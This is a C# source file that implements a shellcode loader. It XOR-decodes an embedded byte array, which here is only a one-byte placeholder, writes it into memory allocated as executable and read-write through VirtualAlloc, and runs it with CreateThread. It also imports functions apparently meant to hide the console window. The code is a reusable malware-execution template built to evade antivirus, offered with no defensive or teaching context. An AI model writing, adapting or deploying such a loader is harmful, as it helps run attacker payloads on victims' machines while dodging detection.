using System;
using System.Text;
using System.Runtime.InteropServices;


public class Program
{

    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32")]
    static extern IntPtr GetConsoleWindow();

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    private static byte[] xor(byte[] cipher, byte[] key)
    {
        byte[] xored = new byte[cipher.Length];

        for (int i = 0; i < cipher.Length; i++)
        {
            xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
        }

        return xored;
    }


    static void Main()
    {
        string key = "ABCD";

        byte[] xorshellcode = new byte[1] { 0xbd };

        byte[] shellcode;
        shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        return;
    }
}